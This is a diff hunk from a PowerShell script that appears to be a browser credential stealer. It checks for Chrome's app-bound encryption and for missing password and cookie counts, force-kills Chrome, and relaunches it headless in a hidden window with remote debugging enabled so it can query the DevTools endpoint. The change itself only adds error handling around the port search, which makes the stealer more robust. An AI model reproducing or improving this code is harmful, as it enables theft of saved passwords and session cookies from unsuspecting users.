@@ -309,7 +309,7 @@ if ($appBound -and ($pwCount -eq 0 -or $ckCount -eq 0)) {
         Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force; Start-Sleep 2
         $ud = "$env:TEMP\cdp_$([IO.Path]::GetRandomFileName())"
         $port = 9222; $portTry = 0
-        while ((Get-NetTCPConnection -LocalPort $port -ErrorAction SilentlyContinue) -and $portTry -lt 10) { $port++; $portTry++ }
+        try { while ((Get-NetTCPConnection -LocalPort $port -ErrorAction SilentlyContinue) -and $portTry -lt 10) { $port++; $portTry++ } } catch {}
         $p = Start-Process -FilePath $cex -ArgumentList "--remote-debugging-port=$port --user-data-dir=$ud --no-first-run --no-default-browser-check --disable-gpu --headless=new" -PassThru -WindowStyle Hidden
         Start-Sleep 4
         $tgts = Invoke-RestMethod "http://127.0.0.1:$port/json" -TimeoutSec 5 -ErrorAction Stop
